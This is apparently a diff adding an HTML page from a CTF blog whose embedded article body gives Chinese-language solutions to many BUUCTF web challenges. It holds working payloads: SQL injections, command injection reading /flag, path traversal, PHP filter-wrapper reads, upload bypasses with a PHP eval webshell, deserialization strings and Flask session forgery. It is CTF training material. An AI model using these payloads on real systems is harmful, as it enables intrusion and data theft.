@@ -1,0 +1,1055 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>BUUCTF WEB page1 | w8nn9z Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="BUUCTF WEB page1 - w8nn9z Blog">
+<meta name="author" content="">
+<link rel="canonical" href="https://z9nn8w.github.io/posts/ctf/buuojpage1/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="sha256-EqVinQvl&#43;IX9lG13JX5V90An7So1FEop4tsT&#43;PYrXzU=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/ctf/buuojpage1/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/ctf/buuojpage1/">
+  <meta property="og:site_name" content="w8nn9z Blog">
+  <meta property="og:title" content="BUUCTF WEB page1">
+  <meta property="og:locale" content="zh-cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-07-08T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-07-15T00:00:00+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BUUCTF WEB page1">
+<meta name="twitter:description" content="">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://z9nn8w.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CTF",
+      "item": "https://z9nn8w.github.io/posts/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "BUUCTF WEB page1",
+      "item": "https://z9nn8w.github.io/posts/ctf/buuojpage1/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "BUUCTF WEB page1",
+  "name": "BUUCTF WEB page1",
+  "description": "",
+  "keywords": [
+    
+  ],
+  "articleBody": "[极客大挑战 2019]EasySQL 一个登录页面，猜测存在用户名admin，万能密码登录成功直接回显flag：\n?username=admin\u0026password=1'+or+1+%23 flag{ecd75a20-0982-4d18-b5ea-ca0d11d6ce37}\n[极客大挑战 2019]Havefun 源码有段注释，GET传参?cat=dog即可：\nflag{ea9d4a51-1fd0-40a7-82bd-c5097a9a09fb}\n[ACTF2020 新生赛]Include 起始页面有个tips，通过href属性实现了传参?file=flag.php并定向到如下页面：\nCan you find out the flag? 猜测对file的值用include来进行操作，导致php文件代码被解析，考虑使用伪协议把flag.php编码为base64数据流进行读取\n?file=php://filter/read=convert.base64-encode/resource=flag.php 再对base64进行解码即可：\nPD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NjRkYjcwNDMtZDQ2YS00YjRlLWFlNDUtOGQwNzU4MGUxZTZmfQo=\r\u003c?php\recho \"Can you find out the flag?\";\r//flag{64db7043-d46a-4b4e-ae45-8d07580e1e6f} [HCTF 2018]WarmUp 源码注释：\nsource.php：\n\u003c?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026$page) { $whitelist = [\"source\"=\u003e\"source.php\",\"hint\"=\u003e\"hint.php\"]; if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file']) \u0026\u0026 is_string($_REQUEST['file']) \u0026\u0026 emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo \"\n\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /\u003e\"; } ?\u003e 可以发现，只需传入?file=hint.php即可第一次就return true，从而获取hint.php执行后的内容：\nflag not here, and flag in ffffllllaaaagggg php中include有这样的特性，会对文件路径先进行规范化处理，处理时不会检验目录(如hint.php?)是否存在，于是可以构造这样的payload：\n?file=hint.php?../../../../../ffffllllaaaagggg 有足够多的../，include对路径进行处理后就相当于执行：include(\"/ffffllllaaaagggg\")\nflag{8c145a85-2948-4a4a-94fc-10bcb05cc91d}\n[ACTF2020 新生赛]Exec 123;find / -name flag\rPING 123 (0.0.0.123): 56 data bytes\r--- 123 ping statistics ---\r3 packets transmitted, 0 packets received, 100% packet loss\r/flag\r123;cat /flag\rPING 123 (0.0.0.123): 56 data bytes\r--- 123 ping statistics ---\r3 packets transmitted, 0 packets received, 100% packet loss\rflag{47584b5d-c259-40a3-9272-976c97ef47a1} [GXYCTF2019]Ping Ping Ping 先绕过空格读取index.php：\n\u003c?php if(isset($_GET['ip'])){ $ip = $_GET['ip']; if(preg_match(\"/\\\u0026|\\/|\\?|\\*|\\\u003c|[\\x{00}-\\x{1f}]|\\\u003e|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match)){ echo preg_match(\"/\\\u0026|\\/|\\?|\\*|\\\u003c|[\\x{00}-\\x{20}]|\\\u003e|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match); die(\"fxck your symbol!\"); } else if(preg_match(\"/ /\", $ip)){ die(\"fxck your space!\"); } else if(preg_match(\"/bash/\", $ip)){ die(\"fxck your bash!\"); } else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip)){ die(\"fxck your flag!\"); } $a = shell_exec(\"ping -c 4 \".$ip); echo \"\"; print_r($a); } ?\u003e 过滤了很多，拼接字符串绕过即可：\n?ip=127.0.0.1;a=ag;b=fl;cat$IFS$9$b$a.php 源码注释中获取flag：flag{07709504-1033-43f4-b6dc-c8d428fb70bb}\n[SUCTF 2019]EasySQL 多次进行fuzz测试，发现过滤了union from where等常见语句，同时能大致猜测出后端的查询语句结构：\n114,5,66\rArray ( [0] =\u003e 114 [1] =\u003e 5 [2] =\u003e 1 ) 114,5,0\rArray ( [0] =\u003e 114 [1] =\u003e 5 [2] =\u003e 0 ) 猜测查询语句中有逻辑或||，可能结构如下：\nselect post_query || column_name from table_name 查一下有哪些表：\n1;show tables;\rArray ( [0] =\u003e 1 ) Array ( [0] =\u003e Flag ) 因为只有一张表，查询语句可以进一步精确：\nselect post_query || column_name from Flag 通配符未被过滤，于是可以构造出最终payload：\n*,514\rArray ( [0] =\u003e flag{a712b4db-9fc5-41b5-8a6a-f0b18f52d576} [1] =\u003e 1 ) 看了题目后端源码和其他师傅的wp发现还有一种做法，通过修改mysql配置来将||的功能更改为类似concat的功能：\n2;set sql_mode=pipes_as_concat;select 3\rArray ( [0] =\u003e 2 ) Array ( [0] =\u003e 3flag{a712b4db-9fc5-41b5-8a6a-f0b18f52d576} ) [极客大挑战 2019]LoveSQL 万能密码登录成功，回显了admin的账号和密码：\nHello admin！\rYour password is '1715a9fd6c554e96be4451229db26a83' 查字段数：\n?username=admin'+order+by+4+%23\u0026password=1\r报错：Unknown column '4' in 'order clause'\r?username=admin'+order+by+3+%23\u0026password=1\r正常回显账号密码，说明字段数为3 查注入位置：\n?username=-1'+union+select+1%2C2%2C3+%23\u0026password=1\rHello 2！\rYour password is '3' 查表名：\n?username=-1'+union+select+1%2C2%2Cgroup_concat(table_name)+from+information_schema.tables+where+table_schema%3Ddatabase()+%23\u0026password=1\rHello 2！\rYour password is 'geekuser,l0ve1ysq1' 查列名：\n?username=-1'+union+select+1%2C2%2Cgroup_concat(column_name)+from+information_schema.columns+where+table_name%3D'l0ve1ysq1'+%23\u0026password=1\rHello 2！\rYour password is 'id,username,password' 查字段数据：\n-1' union select 1,group_concat(username),group_concat(password) from l0ve1ysq1 #\rHello cl4y,glzjin,Z4cHAr7zCr,0xC4m3l,Ayrain,Akko,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,leixiao,flag！\rYour password is 'wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag{a77c55c1-2629-477d-9d24-fbdcfcc722c5}' [极客大挑战 2019]Secret File 抓包在前端源码里能看到注释，访问secr3t.php，php伪协议传base64编码的flag.php：\n\u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e \u003ctitle\u003eFLAG\u003c/title\u003e \u003c/head\u003e \u003cbody style=\"background-color:black;\"\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e \u003ch1 style=\"font-family:verdana;color:red;text-align:center;\"\u003e啊哈！你找到我了！可是你看不到我QAQ~~~\u003c/h1\u003e\u003cbr\u003e\u003cbr\u003e\u003cbr\u003e \u003cp style=\"font-family:arial;color:red;font-size:20px;text-align:center;\"\u003e \u003c?php echo \"我就在这里\"; $flag = 'flag{d2998aa0-03cb-4738-8117-271f44690fdc}'; $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd' ?\u003e \u003c/p\u003e \u003c/body\u003e \u003c/html\u003e [强网杯 2019]随便注 单引号闭合，字段数为2，还有过滤，尝试绕过无果，考虑使用堆叠注入：\nreturn preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject); 获取表名：\n1';show tables # 对两张表\"1919810931114514\"和\"words\"分别查询字段名，用反引号包裹表示表名：\n1';show columns from `1919810931114514` #\r1';show columns from `words` # flag在表\"1919810931114514\"中，没想到好的办法，参考了其他师傅的wp\n方法一：使用handler进行查询，不过handler并没有包含到SQL标准中，handler查询流程如下，只能一行一行获取数据：\nhandler table_name open\rhandler table_name read first\rhandler table_name read next\r...\rhandler table_name colse 可以自由获取当前表第一行、后一行、前一行、最后一行数据 first | next | prev | last\n1';handler `1919810931114514` open;handler `1919810931114514` read first;handler `1919810931114514` close #\rarray(1) {\r[0]=\u003e\rstring(42) \"flag{468432d7-1f83-4a68-a18b-41d3bca79d4c}\"\r} 方法二：将1919810931114514表名换为words，再将表中字段名flag改为data，添加具有默认值的字段id：\n1';alter table `words` rename to `test`;alter table `1919810931114514` rename to `words`;alter table `words` add id int(10) DEFAULT '114';alter table `words` change `flag` `data` varchar(100) # 查询id=114即可获取flag\n还有一种方法，concat+sql预编译，绕过select ，但是本题好像重新加了过滤，打不通了？\n1';set @a = concat(\"sele\",\"ct \",\"flag \",\"from `1919810931114514`\");prepare test from @a;execute test #\r返回：strstr($inject, \"set\") \u0026\u0026 strstr($inject, \"prepare\")，可能是waf？ [极客大挑战 2019]Http 源码里有个href属性，可以转到Secret.php，之后添加referer，修改UA头，添加XFF：\nUser-Agent: Syclover\rReferer: https://Sycsecret.buuoj.cn\rX-forwarded-for: 127.0.0.1 flag{eee1d380-bd94-4869-abab-7d2efd802354}\n[极客大挑战 2019]Upload 绕过.php后缀，content-type，文件头，以及\u003c?字符的过滤：\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.phtml\"\rContent-Type: image/png\rGIF89a flag{e5eb2a91-3a85-4648-a111-457d0365762a}\n[极客大挑战 2019]Knife 直接给了shell，把执行结果写到了html里，看源码就行：flag{d304b859-96a0-4f0f-8f80-f4e18ee9404f}\n[ACTF2020 新生赛]Upload 前端要求上传jpg、png、gif结尾的图片，改一下后缀，后端也有后缀校验，再改一下phtml绕过即可：\nContent-Disposition: form-data; name=\"upload_file\"; filename=\"shell.phtml\"\rContent-Type: image/jpeg\r\u003c?php @eval($_POST[\"shell\"]); ?\u003e flag{4dbe9002-16a0-4972-9af5-dc6bbb7a5400}\n[极客大挑战 2019]BabySQL 单引号闭合，fuzz发现存在对关键字or,union,select,where,from的过滤，大小写无法绕过，尝试双写绕过：\n1' uniunionon seleselectct 1,2,3 #\r1' uniunionon seleselectct 1,database(),3 #\r1' uniunionon seleselectct 1,group_concat(table_name),3 frfromom infoorrmation_schema.tables whewherere table_schema=database() #\r1' uniunionon seleselectct 1,group_concat(column_name),3 frfromom infoorrmation_schema.columns whewherere table_name=\"b4bsql\" #\r1' uniunionon seleselectct 1,group_concat(username),group_concat(passwoorrd) frfromom `b4bsql` #\rHello cl4y,sql,porn,git,Stop,badguy,hacker,flag！\rYour password is 'i_want_to_play_2077,sql_injection_is_so_fun,do_you_know_pornhub,github_is_different_from_pornhub,you_found_flag_so_stop,i_told_you_to_stop,hack_by_cl4y,flag{f1861fb5-9f3b-46b0-8b23-b198fa61af3e}' [极客大挑战 2019]PHP 下载备份文件www.zip，class.php中有反序列化，绕过wakeup方法即可：\n?select=O%3A4%3A\"Name\"%3A3%3A{s%3A14%3A\"%00Name%00username\"%3Bs%3A5%3A\"admin\"%3Bs%3A14%3A\"%00Name%00password\"%3Bi%3A100%3B} flag{af79b7f8-ff57-4346-b945-207910c0808b}\n[ACTF2020 新生赛]BackupFile 扫一下目录，扫出index.php.bak，弱比较，key传123即可\nflag{1032bda2-5d01-4701-86f7-db6ba9d16d69}\ncalc.php：\n\u003c?php error_reporting(0); if(!isset($_GET['num'])){ show_source(__FILE__); }else{ $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $str)) { die(\"what are you want to do?\"); } } eval('echo '.$str.';'); } ?\u003e 执行需要参数的命令的符号基本都被ban了，考虑无参rce，但是发现传入非数字就会forbbiden，猜测是waf\n可以通过php解析特性来绕过该waf，由于waf只针对num，而php可以将%20num等同样解析为变量num，参考文章\n方法一：session_start()\n?%20num=1;eval(hex2bin(session_id(session_start()))) Cookie: PHPSESSID=73797374656d2827696427293b 发现不能执行system命令，查了disable_functions，许多系统命令都被ban了：\n考虑使用scandir()直接获取根目录文件名：\n再用readfile读取/f1agg即可：flag{1b105168-e27d-4256-b85b-ee49c80f6127}\n方法二：get_defined_vars()\n获取根目录下文件名：\n?%20num=1;eval(end(current(get_defined_vars())));\u0026cmd=var_dump(scandir('/')); 读取文件：\n? num=1;eval(end(current(get_defined_vars())));\u0026cmd=readfile(\"/f1agg\"); [极客大挑战 2019]BuyFlag pay.php网页源码注释：\n弱类型比较，科学计数法：\n[HCTF 2018]admin 注册了一个账号，修改密码页面有注释：\n已经无法访问了，从其他师傅wp那里大概知道这题是考flask session伪造，源码里包含了secret key：ckj123\nflask-session-cookie-manager\u003epython flask_session_cookie_manager3.py decode -c \".eJw9kMGKgzAURX9leOsuNDqbQhcFo7TDiwRiQ7IpMzbVqumAWhpT-u8TOtD1hXvPuQ84nkcztbCex5tZwfFygvUDPn5gDarLWyWUUyIfdDb0zFceZd6rrk6VqFJW0KgsDi0TKi4lpihYq3wdMYsLK7jDgjqW8TtKvmBWJyyjnyh4rGU-YNc4LWmEnnokB4sFLspiUgpKWNZH2IVdwlMtalLKwNFhrGxFmOBOd7tU-b1lni_aBibfbOC5gnoaz8f5tzfXt4KWKmBtU213AaWKlT9dGKlcKVhQ4klQiXTWJ-jzVmdNQKCu3G5edRf73Zh3kxn2X-L-n1y_bQhgNtMckwRWcJvM-HoO4gief-6_bUg.aHdOEw.PpWIfOw5jpT3vcj8KowQEhsohU8\" -s \"ckj123\" {'_fresh': True, '_id': b'b1aa61a1ed9d7531adb78a584a48ea5659c813ac746c24d10a14401d2077419145eae281ea43133ef0c2bc7916494261cd8e769aab35be6541f28c2f742fe338', 'csrf_token': b'ef8108fb1455c7b7e193ed47b74d9731ad82ba18', 'image': b'zRJO', 'name': 'test123', 'user_id': '10'} 进行伪造：\nflask-session-cookie-manager\u003epython flask_session_cookie_manager3.py encode -s \"ckj123\" -t \"{'_fresh': True, '_id': b'b1aa61a1ed9d7531adb78a584a48ea5659c813ac746c24d10a14401d2077419145eae281ea43133ef0c2bc7916494261cd8e769aab35be6541f28c2f742fe338', 'csrf_token': b'ef8108fb1455c7b7e193ed47b74d9731ad82ba18', 'image': b'zRJO', 'name': 'admin', 'user_id': '10'}\" .eJw9kM2KwjAYRV9l-NYu-jcbwYWQtOjwpQRSQ7IRrbW_6UCrmEZ89wkOuL5w7zn3CcfrVM0NrG_TvVrBsb3A-glfZ1iD6tJGCWWVSAdNhp65wqFMe9WViRJFwjIa5NmhYUKFucQEBWuUKwNmcGEZt5hRywh_oOQLkjJmhH6j4KGW6YBdbbWkATrqMDoYzHBRBuNc0IiRPsDO70Y80aKMcuk5OgyVKSImuNXdLlFub5jjizaeydUbeK2gnKfr8fbbV-NHQUvlsbaJNjuPUoTKXVoWFTYXzCvx2KsEmvQxurTRpPYI1ObbzbuuNae6-jRVw_5HPP6T8WR8AKeLaUdYwX2upvdvEAbw-gMYqWz7.aHdQJg.qOQUFjkSIcK-N5yQTFZB71QV_3w 带着Cookie访问即可获得flag：flag{db63520d-2657-42dd-9714-86af4e544761}\n[BJDCTF2020]Easy MD5 抓包，相应包有hint：\nhint: select * from 'admin' where password=md5($pass,true) 当password为ffifdyop时，生成的md5对应字节'or'6É]é!r,ùíb，对应万能密码\nlevels91.php，数组绕过：\nlevell14.php，强比较，依然可以数组绕过：\n\u003c?php\rerror_reporting(0);\rinclude \"flag.php\";\rhighlight_file(__FILE__);\rif($_POST['param1']!==$_POST['param2']\u0026\u0026md5($_POST['param1'])===md5($_POST['param2'])){\recho $flag;\r} flag{da0914dd-06b9-4037-8de6-8ee4bbee3bc0}\n[MRCTF2020]你传你🐎呢 能解析的php文件后缀都被过滤了，也有对content-type的检测，但是没有对上传文件内容进行检测，考虑上传.htaccess来使当前目录下的jpg解析为php：\nContent-Disposition: form-data; name=\"uploaded\"; filename=\".htaccess\"\rContent-Type: image/jpeg\rAddHandler php5-script .jpg\r再上传.jpg后缀的一句话木马即可拿shell，好像不能执行system命令，直接连蚁剑：\nflag{69395339-10e2-4e7f-abb6-dc94aa0599b3}\n[护网杯 2018]easy_tornado 获取文件的方式是filename+filehash，如获取flag.txt：\nfile?filename=/flag.txt\u0026filehash=34f85d5ac5453cca27b9e169661f78f0 flag.txt：\nflag in /fllllllllllllag hints.txt中给出了哈希计算方式：\nmd5(cookie_secret+md5(filename)) 先随便传个filename，跳转到了error路由下，结合welcome.txt中所说的render，应该是SSTI来获取cookie_secret\n官方文档有cookie_secret的相关资料，github上tornado的源码中也有关于cookie_secret的资料：\nclass RequestHandler:\r...\r@property\rdef settings(self) -\u003e Dict[str, Any]:\r\"\"\"An alias for `self.application.settings `.\"\"\"\rreturn self.application.settings\r...\rself.require_setting(\"cookie_secret\", \"secure cookies\")\rsecret = self.application.settings[\"cookie_secret\"] settings是self.application.settings的别名，上网搜索后发现handler对应当前的RequestHandler对象，尝试传入?msg={{handler.settings}}：\n{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': 'fd02ee5f-2cf0-43a6-a443-68425cd6a1eb'} 计算flag文件filehash即可：\nfile?filename=/fllllllllllllag\u0026filehash=af5f2ddcd41b3c976e0f039d8ee99bf6 flag{80eb5834-b9f0-46a0-ac82-3eb81f6883a6}\n[ZJCTF 2019]NiZhuanSiWei data协议传入text，先用伪协议读取useless.php：\n?text=data:,welcome to the zjctf\u0026file=php://filter/read=convert.base64-encode/resource=useless.php useless.php：\n\u003c?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-\u003efile)){ echo file_get_contents($this-\u003efile); echo \"\n\";\rreturn (\"U R SO CLOSE !///COME ON PLZ\");\r} } } ?\u003e 有个tostring的魔术方法，反序列化时当一个对象被当作一个字符串时使用，index.php里有echo，必定会触发该方法：\n?text=data:,welcome to the zjctf\u0026file=useless.php\u0026password=O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D 网页源码：\noh u find it \u003c?php\rif(2===3){ return (\"flag{09942828-3ac1-4ba0-ab1a-84c6e5784ac3}\");\r}\r?\u003e [MRCTF2020]Ez_bypass 整理一下页面的代码：\nI put something in F12 for you include 'flag.php'; $flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'; if(isset($_GET['gg'])\u0026\u0026isset($_GET['id'])) { $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) \u0026\u0026 $id !== $gg) { echo 'You got the first step'; if(isset($_POST['passwd'])) { $passwd=$_POST['passwd']; if (!is_numeric($passwd)) { if($passwd==1234567) { echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); } else { echo \"can you think twice??\"; } } else{ echo 'You can not get it !'; } } else{ die('only one way to get the flag'); } } else { echo \"You are not a real hacker!\"; } } else{ die('Please input first'); } }Please input first ?id[]=1\u0026gg[]=2\rpasswd=1234567a flag.php：\n\u003c?php\r$flag=\"flag{dd110346-bea7-4cc0-b2ad-0347ae572a4f}\"\r?\u003e [极客大挑战 2019]HardSQL 单引号闭合，fuzz了一下，过滤了空格,and,union,substr等，用括号来绕过空格过滤，尝试报错注入：\n1'or(updatexml(1,concat(0x7e,database(),0x7e),1))# XPATH syntax error: '~geek~' 1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))# XPATH syntax error: '~H4rDsq1~' 1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(\"H4rDsq1\")),0x7e),1))# XPATH syntax error: '~id,username,password~' 1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(`H4rDsq1`)),0x7e),1))# XPATH syntax error: '~flag{0db504ac-df00-4099-8bf4-b4' 1'or(updatexml(1,(concat(0x7e,right((select(group_concat(password))from(`H4rDsq1`)),30),0x7e)),1))# XPATH syntax error: '~c-df00-4099-8bf4-b42864fa1e80}~' [网鼎杯 2020 青龙组]AreUSerialz 只需要传入int型的2即可绕过强比较，从而读取flag.php：\n\u003c?php class FileHandler { protected $op = 2; protected $filename = \"flag.php\"; protected $content = \"test\"; } print(urlencode(serialize(new FileHandler()))); ?\u003e O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3Bs%3A4%3A%22test%22%3B%7D 但是由于是protected，会生成%00导致无法通过is_valid，不知道如何绕过，看了其他师傅的wp，特定版本的php对访问修饰符不敏感：PHP版本7.1+，对属性的类型不敏感。本题php版本7.4.3，也就是说可以在构造序列化字符串时将成员全部设为public，最终payload：\nO%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A7%3A%22content%22%3Bs%3A4%3A%22test%22%3B%7D flag{7c768194-7c00-4622-ae29-be5fc9a232ac}\n[GXYCTF2019]BabyUpload 过滤ph后缀，先上传.htaccess，再上传shell.jpg即可，注意将一句话木马改为script标签：\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"shell.jpg\"\rContent-Type: image/jpeg\rflag{7a45bf74-6807-4299-9622-3604e7877b20}\n[SUCTF 2019]CheckIn .htaccess和php后缀全被过滤，还有对于图片头的检测，考虑上传.user.ini：\nGIF89a\rcgi.fix_pathinfo = 1\rengine = on\rauto_prepend_file=shell.jpg\rauto_append_file=shell.jpg 在.user.ini同一目录下的任意php文件被解析时，都会在开头和结尾包含shell.jpg文件，蚁剑连接即可\nflag{bee6042e-5315-4127-a851-a4f06a8dd254}\n[GYCTF2020]Blacklist 和强网杯的随便注感觉没区别，用handler代替select：\n1';handler `FlagHere` open;handler `FlagHere` read first;handler `FlagHere` close # flag{6495833f-bb80-4b8b-858e-e7d99e474b89}\n[RoarCTF 2019]Easy Java 第一道java题。点击help跳转到Download路由下，有一个任意文件读取，简单了解了一下java web项目的结构：\n/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则\r/WEB-INF/classes/：包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中\r/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件，如数据库驱动jar文件\r/WEB-INF/src/：源码目录，按照包名结构放置各个 Java 文件\r/WEB-INF/database.properties：数据库配置文件\r/WEB-INF/tags/：存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名\r/WEB-INF/jsp/：jsp 文件的存放位置。改目录没有特定的声明，同样，可以根据自己的喜好与习惯来命名。此目录主要存放的是 jsp 1.2 以下版本的文件，为区分 jsp 2.0 文件，通常使用 jsp 命名，当然你也可以命名为 jspOldEdition 考虑读取web.xml文件，将请求方式改为POST：\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e ",
+  "wordCount" : "5396",
+  "inLanguage": "en",
+  "datePublished": "2025-07-08T00:00:00Z",
+  "dateModified": "2025-07-15T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://z9nn8w.github.io/posts/ctf/buuojpage1/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "w8nn9z Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://z9nn8w.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://z9nn8w.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/posts" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://z9nn8w.github.io/about" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      BUUCTF WEB page1
+    </h1>
+    <div class="post-meta"><span title='2025-07-08 00:00:00 +0000 UTC'>July 8, 2025</span>
+
+</div>
